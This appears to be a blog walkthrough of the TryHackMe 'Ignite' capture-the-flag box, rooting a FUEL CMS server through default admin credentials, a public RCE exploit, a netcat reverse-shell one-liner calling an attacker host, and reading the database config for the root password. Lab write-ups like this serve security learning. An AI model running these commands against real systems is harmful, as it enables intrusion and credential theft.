Ignite CTF THM Walkthrough:
A new start-up has a few issues with their web server.
Alon Presman
Alon Presman

3 min read
·
May 19





Root the box!

Difficulty: Easy

Firstly, I’ll start with nmap tool for enumeration

<nmap -sC -sV <ip-address>>
Results:


nmap scan
there is 1 open port. this is http port and we get a http title : “welcome to FUEL CMS”. this title telling us about which CMS this site is using. In addition there is another header that can help us :
http-robots.txt and /fuel/.

I’ll check robots.txt file and I can find fuel dir. when I connected to this dir there is a login page from Fuel CMS.


login page
I don't know what to do yet but so i will try to use the default credentials. {admin:admin} and I found myself inside the system.


admin dashboard
I checked for an input that I can inject there a code that will give me php reverse-shell.
I didn't find any that i can inject there. so its time to search vulnerabilities in FUEL CMS in Metasploit. look what I found!
there is RCE vulnerability so I'm going to download it to my kali.


searchsploit results

get that code
give it permissions.


chmod 777 50477.py
started to read that code to understand the way it works and how to exploit it.


I got type of connection and a type of shell. in that shell I tried to execute some commands and ‘ls’ was the command that works.
so lets try to execute a reverse shell code for a real connection.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip><port> >/tmp/f
and a netcat listener on our machine on the same port.

nc -lnvp <port>
then we got the wanted reverse shell.


rev shell
so the first command will be :

python -c 'import pty; pty.spawn("/bin/bash")'
this command gives us a better shell and comfortable to use.
next command will be ‘ls’ and flag.txt found!!!


flag.txt
now I'm going to back the first page that appeared in this CTF and there I can see where the database is located.


it gives us the location of the db.
cat /var/www/html/fuel/application/config/database.php
results:


so, its time to root.

su root
enter the password and move to /root dir and there is the root.txt flag!


root.txt
Its the end! hope you find it helpful.

enjoy!
